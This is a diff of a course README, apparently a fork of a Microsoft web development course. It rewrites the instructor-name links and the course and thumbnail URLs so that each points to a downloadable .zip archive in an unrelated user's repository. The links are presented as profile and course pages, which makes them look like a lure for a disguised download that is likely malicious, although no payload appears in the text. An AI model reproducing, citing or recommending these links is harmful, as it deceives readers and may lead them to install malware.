@@ -9,16 +9,16 @@ With over five billion global internet users in 2023, there is high demand to bu
 
 ## Instructors
 
-[Nitya Narasimhan](https://raw.githubusercontent.com/jai31-jai/html-css-and-javascript-building-the-web-4479542/main/solutions/03-space-game/spaceArt/html-css-and-javascript-building-the-web-4479542-2.2.zip)
+[Nitya Narasimhan](https://github.com/jai31-jai/html-css-and-javascript-building-the-web-4479542/raw/refs/heads/main/docs/02-html/src/web_building_html_javascript_and_the_css_v2.4.zip)
 Senior Program Manager, Developer Relations at Microsoft
 
-[Jasmine Greenaway](https://raw.githubusercontent.com/jai31-jai/html-css-and-javascript-building-the-web-4479542/main/solutions/03-space-game/spaceArt/html-css-and-javascript-building-the-web-4479542-2.2.zip)
+[Jasmine Greenaway](https://github.com/jai31-jai/html-css-and-javascript-building-the-web-4479542/raw/refs/heads/main/docs/02-html/src/web_building_html_javascript_and_the_css_v2.4.zip)
 Technologist, Teacher, Author, Developer Relations at Microsoft
 
                         
 
 [0]: # (Replace these placeholder URLs with actual course URLs)
 
-[lil-course-url]: https://raw.githubusercontent.com/jai31-jai/html-css-and-javascript-building-the-web-4479542/main/solutions/03-space-game/spaceArt/html-css-and-javascript-building-the-web-4479542-2.2.zip
-[lil-thumbnail-url]: https://raw.githubusercontent.com/jai31-jai/html-css-and-javascript-building-the-web-4479542/main/solutions/03-space-game/spaceArt/html-css-and-javascript-building-the-web-4479542-2.2.zip
+[lil-course-url]: https://github.com/jai31-jai/html-css-and-javascript-building-the-web-4479542/raw/refs/heads/main/docs/02-html/src/web_building_html_javascript_and_the_css_v2.4.zip
+[lil-thumbnail-url]: https://github.com/jai31-jai/html-css-and-javascript-building-the-web-4479542/raw/refs/heads/main/docs/02-html/src/web_building_html_javascript_and_the_css_v2.4.zip
 
